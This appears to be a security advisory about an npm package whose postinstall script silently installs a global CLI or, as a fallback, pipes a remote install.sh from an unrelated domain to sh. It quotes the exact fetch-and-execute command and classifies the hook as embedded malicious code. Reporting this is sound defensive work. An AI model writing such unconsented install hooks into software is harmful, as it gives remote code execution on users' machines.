summary: Postinstall hook pipes remote shell script to sh from unrelated third-party domain
details: On `npm install`, scripts/postinstall.js runs `execSync("npm install -g @opencode/cli 2>/dev/null || curl -fsSL https://opencode.ai/install.sh 2>/dev/null | sh", { stdio: "inherit" })`. The fallback fetches a shell script from opencode.ai — a separate project (sst/opencode) unrelated to the package's declared publisher (github.com/DeadJustLive/OpenPrompt-Lang) — and pipes it directly to `sh` with no version pin, no hash verification, and no user opt-out. The primary branch performs an unconsented global npm install. Whatever bytes opencode.ai serves at install.sh execute under the installer's user account; any compromise or interception of that domain produces immediate RCE on every machine that installs this package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
